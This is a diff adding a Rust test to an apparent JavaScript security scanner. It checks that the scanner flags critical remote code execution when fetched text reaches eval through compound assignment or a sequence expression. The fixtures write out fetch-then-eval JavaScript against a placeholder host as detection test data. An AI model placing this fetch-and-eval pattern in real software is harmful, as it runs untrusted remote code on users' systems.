@@ -928,6 +928,42 @@ fn remote_labels_survive_object_and_argument_spread() {
 }
 
 #[test]
+fn assignment_and_sequence_expressions_keep_their_javascript_value_semantics() {
+    for (label, expression, expected) in [
+        (
+            "compound-assignment",
+            "let code = await response.text(); code += ''; eval(code);",
+            true,
+        ),
+        ("sequence-last-remote", "eval((0, payload));", true),
+        ("sequence-last-static", "eval((payload, 'literal'));", false),
+    ] {
+        let root = temporary_directory(label);
+        let source = format!(
+            "const response = await fetch('https://example.invalid/payload'); const payload = await response.text(); {expression}"
+        );
+        fs::write(root.join("main.js"), source).unwrap();
+
+        let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        let has_remote_execution = report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
+            });
+        assert_eq!(
+            has_remote_execution, expected,
+            "{label}: {}",
+            report["findings"]
+        );
+        fs::remove_dir_all(root).unwrap();
+    }
+}
+
+#[test]
 fn optional_chained_response_properties_reach_dynamic_execution() {
     let root = temporary_directory("optional-response-flow");
     fs::write(
